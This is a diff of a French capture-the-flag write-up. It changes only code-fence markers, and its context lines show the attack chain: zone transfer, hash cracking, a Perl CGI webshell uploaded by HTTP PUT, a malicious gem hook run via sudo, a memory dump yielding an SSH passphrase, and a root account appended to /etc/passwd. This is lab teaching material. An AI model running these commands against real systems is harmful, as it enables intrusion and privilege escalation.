@@ -10,7 +10,7 @@ Gibberish
 
 On trouve 4 ports TCP ouverts dont un DNS. Qui dit DNS et TCP peut vouloir dire AXFR (transfert de zone)...  
 
-```plain
+```
 Starting masscan 1.0.4 (http://bit.ly/14GZzcT)
  -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
 Initiating SYN Stealth Scan
@@ -27,7 +27,7 @@ Sans doute un indice à ce stade mais j'ai du mal à visionner le *CGInx* :D
 
 Le point qui nous intéresse plus c'est un lien en bas de page qui amène vers *rubbish.dev*. ce nom de domaine est l'information qui nous manquait pour réaliser l'AXFR.  
 
-```plain
+```
 $ dig -t AXFR rubbish.dev @10.1.1.44
 
 ; <<>> DiG 9.11.5-P1-2-Debian <<>> -t AXFR rubbish.dev @10.1.1.44
@@ -66,7 +66,7 @@ En dehors du dossier *cgi-bin* on trouve un fichier *.htaccess* lisible (et oui,
 
 Le hash est le suivant : *autumn:$apr1$hyylBPEF$Al0Pvd6k/F7VxunhyM4FI0*. Ce qui est vite cassé avec hashcat :  
 
-```plain
+```
 $ hashcat64.bin -m 1600 -a 0 raw_hash.txt /opt/wordlists/rockyou.txt
 hashcat (v4.1.0) starting...
 
@@ -85,7 +85,7 @@ Vu qu'on a énuméré comme des tarés sans croiser la moindre authentification 
 
 Voyons ce que ce serveur autorise à la racine et sur son dossier *cgi-bin* :  
 
-```plain
+```
 $ curl -D- -XOPTIONS http://administrativepanel.rubbish.dev:20000/
 HTTP/1.1 405 Not Allowed
 Server: nginx/1.14.0 (Ubuntu)
@@ -103,7 +103,7 @@ Connection: keep-alive
 </html>
 ```
 
-```plain
+```
 $ curl -D- -XOPTIONS http://administrativepanel.rubbish.dev:20000/cgi-bin/
 HTTP/1.1 403 Forbidden
 Server: nginx/1.14.0 (Ubuntu)
@@ -119,7 +119,7 @@ Connection: keep-alive
 
 Entrons dans le vif du sujet et voyons si on peut effectuer un PUT :  
 
-```plain
+```
 $ curl -D- -XPUT http://administrativepanel.rubbish.dev:20000/cgi-bin/
 HTTP/1.1 403 Forbidden
 Server: nginx/1.14.0 (Ubuntu)
@@ -131,7 +131,7 @@ Connection: keep-alive
 403 Forbidden
 ```
 
-```plain
+```
 $ curl -D- -XPUT http://administrativepanel.rubbish.dev:20000/
 HTTP/1.1 409 Conflict
 Server: nginx/1.14.0 (Ubuntu)
@@ -151,7 +151,7 @@ Connection: keep-alive
 
 On peut récupérer [une backdoor CGI en Perl](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/pl-cgi/perlcmd.cgi) et tenter de la placer sous la racine web :  
 
-```plain
+```
 $ curl -D- http://administrativepanel.rubbish.dev:20000/ --upload-file devloop.pl
 HTTP/1.1 100 Continue
 
@@ -172,7 +172,7 @@ Il manque quelques outils sur cette bécane mais il y a *wget* et *netcat* (la v
 
 J'ai lancé un *LinEnum* qui m'a remonté l'autorisation suivante :  
 
-```plain
+```
 [+] We can sudo without supplying a password!
 Matching Defaults entries for www-data on rubbish:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -183,14 +183,14 @@ User www-data may run the following commands on rubbish:
 
 On peut aussi noter la présence de deux process appartenant à root :  
 
-```plain
+```
 root 719 0.0 0.2 36880 9336 ? S Jan04 0:01 /usr/bin/python3 /var/tmp/test.py
 root 720 0.0 0.1 50884 8056 ? Sl Jan04 0:00 /usr/bin/ruby /opt/ssh_backup.rb
 ```
 
 Je reviendrais plus tard sur le premier mais concernant le second le script n'est pas lisible comme on peut le remarquer en listant */opt* :  
 
-```plain
+```
 -rwx------ 1 root   root   70 Jan  3 17:55 ssh_backup.rb
 -rwx------ 1 autumn root 1766 Jan  3 16:03 ssh_key
 ```
@@ -249,7 +249,7 @@ Il est important de générer le *gem* sur la machine distante car sinon on peut
 
 Une fois les fichiers copiés sur la machine on génère et on installe :  
 
-```plain
+```
 www-data@rubbish:/tmp/.devloop/backdoor$ ls
 backdoor.gemspec  lib
 www-data@rubbish:/tmp/.devloop/backdoor$ gem build backdoor.gemspec
@@ -268,7 +268,7 @@ Le fichier *rubygems\_plugin.rb* permet en fait de placer un hook pour la procé
 
 On relance l'installation (on pourrait utiliser n'importe quel *gem* à ce stade) :  
 
-```plain
+```
 www-data@rubbish:/tmp/.devloop/backdoor$ sudo -u autumn /usr/bin/gem install *.gem --local --no-doc
 hi thereeeeeeeeeeeeeeeee
 pre hi there
@@ -279,7 +279,7 @@ Successfully installed backdoor-0.0.1
 
 Et ça marche !  
 
-```plain
+```
 $ ssh autumn@rubbish.dev
 Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-43-generic x86_64)
 
@@ -312,7 +312,7 @@ Finish
 
 La suite est toute tracée :  
 
-```plain
+```
 autumn@rubbish:~$ sudo -l
 Matching Defaults entries for autumn on rubbish:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -323,7 +323,7 @@ User autumn may run the following commands on rubbish:
 
 On peut créer un coredump du process de notre choix. Pourquoi ne pas regarder ce qu'il y a dans la mémoire du process ruby de tout à l'heure (*/opt/ssh\_backup.rb*) ?  
 
-```plain
+```
 $ sudo gcore 720
 [New LWP 751]
 [Thread debugging using libthread_db enabled]
@@ -351,7 +351,7 @@ sshkeypass
 
 On utilise ce mot de passe conjointement à la clé ssh dans */opt* :  
 
-```plain
+```
 autumn@rubbish:/opt$ ssh -i ssh_key root@127.0.0.1
 Enter passphrase for key 'ssh_key':
 Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-43-generic x86_64)
@@ -402,7 +402,7 @@ Cela ne m'a pas sauté aux yeux car j'ai fait la mauvaise supposition que *chmod
 
 C'est assez clair :) On peut donc créer notre lien symbolique vers */etc/passwd* ou */etc/crontab*. Il faut éviter les fichiers sous */root* car ce dernier ne permet pas la traversée du dossier.  
 
-```plain
+```
 www-data@rubbish:~/nginx$ ln -s /etc/passwd devloop.cgi
 www-data@rubbish:~/nginx$ ls -l cgi-bin
 lrwxrwxrwx 1 www-data www-data  11 Jan  5 04:22 devloop.cgi -> /etc/passwd
@@ -418,7 +418,7 @@ python3 -c 'import crypt,getpass; print(crypt.crypt(getpass.getpass(), crypt.mks
 
 On rajoute quelques infos autour du hash et on l'ajoute à */etc/passwd* :
 
-```plain
+```
 www-data@rubbish:~/nginx$ echo 'devloop:$6$YbrFJJEvCx4..w5p$6kP2eYweyD4v.euBgC7lM9rOsHxWJA8u8dY2d0N3lneDXqeYqbzWMQ7QkOrmZW.3IrRBg.ObylQiAp.9JjNdQ/:0:0:devloop:/root:/bin/bash' >> /etc/passwd
 www-data@rubbish:~/nginx$ su devloop
 Password: thisisdope
